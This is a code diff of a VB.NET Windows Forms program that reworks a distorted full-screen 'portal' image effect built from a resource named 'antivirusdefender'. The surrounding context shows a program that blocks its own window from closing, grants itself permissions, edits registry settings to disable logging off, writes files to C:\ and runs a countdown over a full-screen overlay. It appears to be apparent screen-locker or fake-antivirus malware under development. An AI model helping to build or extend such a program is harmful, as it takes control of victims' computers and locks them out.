@@ -291,6 +291,9 @@ Public Class Form1
                 Dim g As Graphics = CreateGraphics()
                 g.SmoothingMode = SmoothingMode.None
 
+                ' Draw portal effect first
+                ApplyPortalEffect(g)
+
                 ' Update the countdown timer label
                 If countdownTime > 0 Then
                     countdownTime -= 1
@@ -370,34 +373,40 @@ Public Class Form1
             Dim gridSize As Integer = 20 ' Size of each pixelated "block"
             portalEffectPhase += 0.05F ' Increment phase for wavy distortion
 
-            ' Load the byte array from resources using My.Resources
-            Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender
+            Try
+                ' Load the byte array from resources using My.Resources
+                Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender
 
-            ' Convert the byte array to an Image
-            Dim portalImage As Image
-            Using ms As New MemoryStream(portalImageBytes)
-                portalImage = Image.FromStream(ms)
-            End Using
+                ' Convert the byte array to an Image
+                Dim portalImage As Image
+                Using ms As New MemoryStream(portalImageBytes)
+                    portalImage = Image.FromStream(ms)
+                End Using
 
-            ' Save the image to file
-            Dim filePath As String = "C:\antivirusdefender.png"
-            portalImage.Save(filePath, System.Drawing.Imaging.ImageFormat.Png)
+                ' Save the image to file
+                Dim filePath As String = "C:\antivirusdefender.png"
+                portalImage.Save(filePath, System.Drawing.Imaging.ImageFormat.Png)
 
-            ' Draw the image with the portal effect
-            For y As Integer = 0 To Height Step gridSize
-                For x As Integer = 0 To Width Step gridSize
-                    ' Add randomness to the sine wave calculation for distortion
-                    Dim randomOffsetX As Integer = random.Next(-5, 6) ' Random offset between -5 and 5
-                    Dim randomOffsetY As Integer = random.Next(-5, 6) ' Random offset between -5 and 5
+                ' Draw the image with the portal effect
+                For y As Integer = 0 To Height Step gridSize
+                    For x As Integer = 0 To Width Step gridSize
+                        ' Add randomness to the sine wave calculation for distortion
+                        Dim randomOffsetX As Integer = random.Next(-5, 6) ' Random offset between -5 and 5
+                        Dim randomOffsetY As Integer = random.Next(-5, 6) ' Random offset between -5 and 5
 
-                    ' Calculate distorted positions using sine wave and random offsets
-                    Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10) + randomOffsetX
-                    Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10) + randomOffsetY
+                        ' Calculate distorted positions using sine wave and random offsets
+                        Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10) + randomOffsetX
+                        Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10) + randomOffsetY
 
-                    ' Draw the image at the distorted coordinates
-                    g.DrawImage(portalImage, distortedX, distortedY, gridSize, gridSize)
+                        ' Draw the image at the distorted coordinates
+                        g.DrawImage(portalImage, distortedX, distortedY, gridSize, gridSize)
+                    Next
                 Next
-            Next
+
+            Catch ex As Exception
+                ' Handle exceptions, e.g., log the error or display a message
+                MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            End Try
         End Sub
 
         ' Prevent form from closing
@@ -1158,7 +1167,6 @@ Public Class Form1
         WriteMessageToNotepad()
         GrantSelfPermissions()
         VisualEffectTimer.Start()
-        portalTimer.Start()
         overlay = New FullScreenOverlay()
         overlay.Show()
         ' Update registry settings and disable Log off
@@ -1185,16 +1193,6 @@ Public Class Form1
         Catch ex As Exception
             MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
-    End Sub
-
-    Private Sub PortalTimer_Tick(sender As Object, e As EventArgs) Handles portalTimer.Tick
-        ' Clear the screen by drawing a blank background
-        Using g As Graphics = CreateGraphics()
-            ' Fill the form with a solid color to clear any existing drawings
-            g.Clear(BackColor)
-            overlay = New FullScreenOverlay
-            overlay.ApplyPortalEffect(g)
-        End Using
     End Sub
 
     Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
